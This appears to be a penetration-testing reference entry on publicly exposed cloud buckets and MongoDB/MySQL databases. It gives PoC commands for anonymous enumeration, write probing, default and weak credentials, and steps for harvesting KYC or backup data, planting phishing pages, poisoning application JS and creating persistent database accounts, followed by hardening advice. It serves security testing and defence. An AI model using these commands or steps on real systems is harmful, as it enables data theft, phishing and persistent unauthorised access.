---
title: Exposed object storage and data stores (OSS / S3 / MinIO / MySQL / MongoDB)
cve: None (configuration flaw)
severity: high
cvss: 8.6
product: Alibaba Cloud OSS / Tencent Cloud COS / AWS S3 / MinIO / MySQL / MongoDB
versions: Any
ports: 80, 443, 9000, 3306, 27017
keywords: oss, s3, bucket, minio, mongodb, mysql, weak passwords, enumeration, kyc
verified: false
sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
---

## Fingerprints

- Resource URLs: `*.oss-cn-*.aliyuncs.com`, `*.cos.ap-*.myqcloud.com`, `*.s3.*.amazonaws.com`, `:9000` (MinIO console), `:27017`, `:3306`.
- `ossUrl`, `bucketName`, `Expires`, and `OSSAccessKeyId` in frontend JS / `config.js` / download links.

## Prerequisites

- Object storage: bucket ACL is `public-read` / `public-read-write` (or the bucket policy allows anonymous List).
- Database: externally reachable + weak passwords (`root/root`, `root/123456`, `admin/admin`, or Mongo without authentication).

## PoC

```bash
# 1) Anonymous OSS / COS / S3 enumeration
curl -s 'https://bucket.oss-cn-hangzhou.aliyuncs.com/?prefix=&max-keys=100'
curl -s 'https://bucket-1250000000.cos.ap-guangzhou.myqcloud.com/?prefix='
aws s3 ls s3://bucket --no-sign-request

# 2) Check write access (write only one harmless probe, then delete it)
curl -X PUT 'https://bucket.oss-cn-hangzhou.aliyuncs.com/probe.txt' -d 'probe'

# 3) MinIO default credentials
curl -s http://target:9000/minio/health/live
# Console: admin / minioadmin, or minioadmin/minioadmin

# 4) Unauthenticated MongoDB access
mongosh "mongodb://target:27017" --quiet --eval 'db.adminCommand({listDatabases:1})'

# 5) Weak MySQL passwords
mysql -h target -uroot -p'root' -e 'select version(); show databases;'
```

## Exploitation Steps

1. Collect bucket/DB domains from the frontend and logs (direct links to images, attachments, and statement PDFs work best).
2. Enumerate → classify by key prefix (`kyc/`, `withdraw/`, `avatar/`, `backup/`, `sql/`); `backup/` and `sql/` often contain full database exports.
3. Writable bucket → upload HTML as an "XSS demonstration/phishing page," or poison application JS by overwriting it (high-risk actions; perform only within the authorized scope).
4. After accessing the DB, first inspect permissions: MySQL `show grants`, Mongo `db.getUser()`; if writes are possible, create a read-only account for long-term observation without changing application data.
5. Evidence: one object name + ETag/size + one `select` result; describe data categories and estimated volume in the report (do not include identity-document images).

## Remediation and Mitigation (Hardening)

- Keep all buckets private + use short-lived presigned URLs; disable anonymous List/Put; enable access logs and anomaly alerts.
- Change MinIO default passwords and restrict it to internal access; separate console and API ports.
- Bind MySQL/Mongo only to internal interfaces, use strong passwords and least-privilege accounts; enable `authorization: enabled` in Mongo.
- Regularly scan for "public buckets/exposed DBs" and turn the first two PoC items above into self-check scripts.

## References

- AWS S3 Block Public Access documentation; Alibaba Cloud OSS permissions and ACLs; MongoDB Security Checklist.
